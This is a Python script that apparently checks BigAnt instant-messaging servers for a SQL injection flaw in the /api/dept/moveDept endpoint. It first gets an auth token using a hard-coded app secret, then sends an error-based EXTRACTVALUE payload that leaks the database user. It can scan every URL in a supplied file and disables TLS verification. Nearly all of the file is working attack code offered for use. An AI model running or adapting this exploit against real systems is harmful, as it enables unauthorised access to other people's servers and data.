import requests
import argparse
from requests import RequestException

requests.packages.urllib3.disable_warnings()


headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36",
    "Accept": "*/*",
    "Content-Type": "application/x-www-form-urlencoded",
}


def get_token(target):
    token_url = "/api/oauth/create_authen"

    token_data = {
        "uid": "1",
        "app_id": "system",
        "app_secret": "www.upsoft01.com",
        "ssid": "CC1743B5-E5D5-42CE-B5F6-42E24464C8D0",
    }

    try:
        token_resp = requests.post(
            target + token_url, headers=headers, data=token_data, verify=False, timeout=30
        )
        if (
            token_resp.status_code == 200
            and '{"status":1' in token_resp.text
            and '"err_code":0' in token_resp.text
        ):
            authen = token_resp.json()['data']['authen']
            return authen
        else:
            print(f"{target} 未获取到token")   
    except RequestException as e:
        print(e)


def check(target):
    sqli_url = "/api/dept/moveDept"

    if not target.startswith("http"):
        target = f"http://{target}"

    authen = get_token(target)
    if authen:
        sqli_data = {
            "authen": f"{authen}",
            "uid": "1",
            "dept_id": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, user(), 0x7e)) AND 'a'='a",
            "taget_parentdept_id": "123",
        }
        try:
            sqli_resp = requests.post(
                target + sqli_url, headers=headers, data=sqli_data, verify=False, timeout=30
            )
            if "~root@localhost~" in sqli_resp.text:
                print(f"{target} 存在漏洞")
        except RequestException as e:
            print(e)


def main(args):
    if args.file:
        try:
            with open(args.file, "r") as f:
                file_content = f.readlines()
        except FileNotFoundError:
            print(f"Error: File '{args.file}' not found.")
            exit(1)
        for f in file_content:
            check(f.strip())
    else:
        check(args.url)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Check BigAnt moveDept SQLi")
    parser.add_argument("-u", "--url", help="Test url")
    parser.add_argument("-f", "--file", help="Test Url File")  # txt文件

    args = parser.parse_args()
    main(args)
